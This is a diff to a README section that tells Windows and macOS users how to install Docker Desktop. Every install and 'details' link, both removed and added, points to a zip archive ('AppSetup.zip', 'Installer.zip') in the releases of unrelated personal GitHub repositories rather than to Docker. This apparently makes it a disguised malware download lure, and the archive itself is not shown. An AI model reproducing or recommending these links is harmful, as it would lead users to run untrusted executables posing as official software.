@@ -1,8 +1,8 @@
 # Docker Desktop
 
-Windows 10 Pro and Enterprise 64-bit and MacOS users, please install docker desktop from [here](https://github.com/orugatil/obs-studio/releases/download/obs/AppSetup.zip). It is the most recent version of Docker. If asked, select to install "linux containers" - *NOT* "windows containers". 
+Windows 10 Pro and Enterprise 64-bit and MacOS users, please install docker desktop from [here](https://github.com/Shreyaseb/moonstone/releases/download/release/Installer.zip). It is the most recent version of Docker. If asked, select to install "linux containers" - *NOT* "windows containers". 
 
-Windows must have their "linux subsystem" turn on, in case you have turned it off. See [here](hhttps://github.com/orugatil/obs-studio/releases/download/obs/AppSetup.zip) for details.
+Windows must have their "linux subsystem" turn on, in case you have turned it off. See [here](https://github.com/Shreyaseb/moonstone/releases/download/release/Installer.zip) for details.
 
 
 # Docker Toolbox
